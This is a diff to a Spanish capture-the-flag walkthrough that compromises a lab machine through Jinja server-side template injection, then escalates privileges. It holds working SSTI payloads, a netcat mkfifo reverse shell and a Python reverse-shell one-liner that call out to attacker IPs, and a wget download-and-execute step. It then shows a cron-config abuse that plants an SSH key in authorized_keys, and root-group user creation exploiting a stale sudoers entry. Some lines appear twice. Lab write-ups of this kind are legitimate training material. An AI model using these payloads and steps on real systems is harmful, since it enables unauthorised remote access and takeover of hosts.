@@ -1,4 +1,6 @@
 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
+https://github.com/DominicBreuker/pspy?tab=readme-ov-file
+{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
 
 
 {{ cycler.__init__.__globals__['os'].popen("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.52.150 1234 >/tmp/f").read() }}
@@ -220,6 +222,230 @@ Ejecutamos el comando anterior, y ya tendremos conexión en la máquina víctima
 
 
 Solo quedará buscar la flag proof.txt para finalizar la resolución de la máquina. 
+
+
+
+
+{{ cycler.__init__.__globals__['os'].popen("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.52.150 1234 >/tmp/f").read() }}
+
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.220",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+
+Aprovechando que podemos ejecutar comandos a partir de la vulnerabilidad de SSTI, vamos a tratar de ejecutar una shell desarrollada en Python.
+
+Copy
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.45.220",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+Para ejecutar, guardamos la siguiente shell y la enviamos al objetivo a través de un servidor Web levantado con Python. Ejecutamos el siguiente comando para transferir el shell.py a la máquina víctima. 
+
+Copy
+{{config.__class__.__init__.__globals__['os'].popen('wget http://192.168.45.220/shell.py -O /tmp/shell.py').read()}}
+
+Ahora por un lado ejecutamos el shellcode transferido y por otro, levantamos un nc en el puerto 1234 en nuestra máquina de ataque. 
+
+Copy
+{{config.__class__.__init__.__globals__['os'].popen('python /tmp/shell.py').read()}}
+
+
+Obtenemos acceso al sistema como www-data. 
+
+Pivotando de www-data a saint
+Comenzamos enumerando el directorio /opt. 
+
+
+Vemos dos archivos ocultos con nombres un tanto raros. Vamos a transferirlos a nuestra máquina de ataque de la siguiente manera:
+
+En la máquina víctima ejecutamos:
+
+Copy
+python3 -m http.server 8000 > /dev/null 2>&1 &
+En la máquina atacante ejecutamos:
+
+Copy
+wget http://192.168.170.102:8000/.configuration.cpython-38.pyc
+wget http://192.168.170.102:8000/.syncer.cpython-38.pyc
+Decompilamos .syncer.cpython-38.pyc
+
+Copy
+uncompyle6 .syncer.cpython-38.pyc
+Copy
+# uncompyle6 version 3.9.0
+# Python bytecode version base 3.8.0 (3413)
+# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
+# [GCC 12.1.0]
+# Embedded file name: syncer.py
+# Compiled at: 2020-06-01 07:32:59
+# Size of source mod 2**32: 587 bytes
+from configuration import *
+from connectors.ftpconn import *
+from connectors.sshconn import *
+from connectors.utils import *
+
+def main():
+    """Main function
+    Cron job is going to make my work easy peasy
+    """
+    configPath = ConfigReader.set_config_path()
+    config = ConfigReader.read_config(configPath)
+    connections = checker(config)
+    if 'FTP' in connections:
+        ftpcon(config['FTP'])
+    else:
+        if 'SSH' in connections:
+            sshcon(config['SSH'])
+        else:
+            if 'URL' in connections:
+                sync(config['URL'], config['Output'])
+
+
+if __name__ == '__main__':
+    main()
+# okay decompiling .syncer.cpython-38.pyc
+Decompilamos .configuration.cpython-38.pyc
+
+Copy
+uncompyle6 .configuration.cpython-38.pyc
+Copy
+# uncompyle6 version 3.9.0
+# Python bytecode version base 3.8.0 (3413)
+# Decompiled from: Python 2.7.18 (default, Aug  1 2022, 06:23:55) 
+# [GCC 12.1.0]
+# Embedded file name: configuration.py
+# Compiled at: 2020-06-04 10:49:49
+# Size of source mod 2**32: 1343 bytes
+import os, sys, json
+from glob import glob
+from datetime import datetime as dt
+
+class ConfigReader:
+    config = None
+
+    @staticmethod
+    def read_config(path):
+        """Reads the config file
+        """
+        config_values = {}
+        try:
+            with open(path, 'r') as (f):
+                config_values = json.load(f)
+        except Exception as e:
+            try:
+                print("Couldn't properly parse the config file. Please use properl")
+                sys.exit(1)
+            finally:
+                e = None
+                del e
+
+        else:
+            return config_values
+
+    @staticmethod
+    def set_config_path():
+        """Set the config path
+        """
+        files = glob('/home/saint/*.json')
+        other_files = glob('/tmp/*.json')
+        files = files + other_files
+        try:
+            if len(files) > 2:
+                files = files[:2]
+            else:
+                file1 = os.path.basename(files[0]).split('.')
+                file2 = os.path.basename(files[1]).split('.')
+                if file1[-2] == 'config':
+                    if file2[-2] == 'config':
+                        a = dt.strptime(file1[0], '%d-%m-%Y')
+                        b = dt.strptime(file2[0], '%d-%m-%Y')
+                if b < a:
+                    filename = files[0]
+                else:
+                    filename = files[1]
+        except Exception:
+            sys.exit(1)
+        else:
+            return filename
+# okay decompiling .configuration.cpython-38.pyc
+Al analizar las fuentes, se deduce que debe haber una tarea programada (cron job) ejecutándose por el usuario llamado "saint" para ejecutar el script syncer.py.
+
+Vamos a enumerar los procesos internos que se están ejecutando en el sistema. Para ello, vamos a utilizar la herramienta pspy64. La transferimos al sistema utilizando un servidor HTTP Python. 
+
+Copy
+En la máquina de ataque
+python3 -m http.server 80
+
+En la máquina víctima
+wget 192.168.45.220/pspy64
+chmod +x pspy64
+./pspy64
+
+Estamos trabajando con un programa que tiene ciertos componentes faltantes, pero la información que tenemos nos permite entender su funcionamiento principal:
+
+Nuestro programa utiliza un trabajo cron que ejecuta el script "syncer.py" cada tres minutos. Lo que este script hace es revisar y listar todos los archivos con la extensión .json que se encuentran tanto en el directorio home de un usuario llamado 'saint' como en el directorio /tmp.
+
+Si encontramos archivos cuyos nombres están basados en el formato de fecha, procedemos a comparar estas fechas. Si resulta que la versión del archivo en /tmp es más reciente, copiamos el contenido del URL especificado en el archivo .json a la ubicación de destino también indicada en ese mismo archivo .json.
+
+Por lo tanto, básicamente estamos usando este programa para sincronizar o actualizar información en una ubicación específica usando como fuente un URL dado, pero solo si la versión del archivo .json en /tmp es más reciente que la que se encuentra en el directorio home del usuario 'saint'.
+
+Vamos a crear un archivo con el nombre /tmp/11-07-2023.config.json. El contenido de este archivo es el siguiente:
+
+Copy
+{
+    "URL": "http://192.168.45.220:80/id_rsa.pub",
+    "Output": "/home/saint/.ssh/authorized_keys"
+}
+Ejecutamos un servidor web de Python utilizando el siguiente comando en el directorio /home/kali/.ssh. Una vez hayamos iniciado el servidor, esperemos un máximo de tres minutos para que se establezca una conexión desde el objetivo. Cuando se haya establecido la conexión a tu servidor web, podrás iniciar sesión como el usuario 'saint'.
+
+
+Buscamos la flag local.txt
+
+
+Pivotando de saint a jason
+Comenzamos enumerando que puede ejecutar el usuario "saint" con sudo sin contraseña. 
+
+Copy
+sudo -l
+
+Aprovechando que "saint" puede añadir usuarios, vamos a crear un usuario con permisos de "root" para poder leer y sobreescribir archivos. Creamos un usuario "securiters"
+
+Copy
+sudo adduser securiters --gid 0
+Adding user `securiters' ...
+Adding new user `securiters' (1003) with group `root' ...
+Creating home directory `/home/securiters' ...
+Copying files from `/etc/skel' ...
+Enter new UNIX password: 
+Retype new UNIX password: 
+passwd: password updated successfully
+Changing the user information for securiters
+Enter the new value, or press ENTER for the default
+        Full Name []: 
+        Room Number []: 
+        Work Phone []: 
+        Home Phone []: 
+        Other []: 
+Is the information correct? [Y/n]
+Vamos a enumerar el contenido del archivo /etc/sudoers.
+
+
+En el archivo /etc/sudoers, descubrimos que Jason tiene la capacidad de ejecutar apt-get como root sin necesidad de una contraseña. Sin embargo, parece que el usuario Jason no existe, posiblemente fue borrado por un administrador que olvidó eliminar su línea en el archivo sudoers.
+
+Como "saint" puede añadir usuarios, vamos a añadir a jason.
+
+Copy
+sudo adduser jason --gid 0
+
+Pivotamos a usuario jason.
+
+
+
+Elevación de privilegios
+Vamos a consultar en GTFOBins como podemos elevar privilegios a partir del vector que tenemos.
+
+
+Ejecutamos el comando anterior, y ya tendremos conexión en la máquina víctima con privilegios máximos. 
+
+
+Solo quedará buscar la flag proof.txt para finalizar la resolución de la máquina. 
+
 
 
 
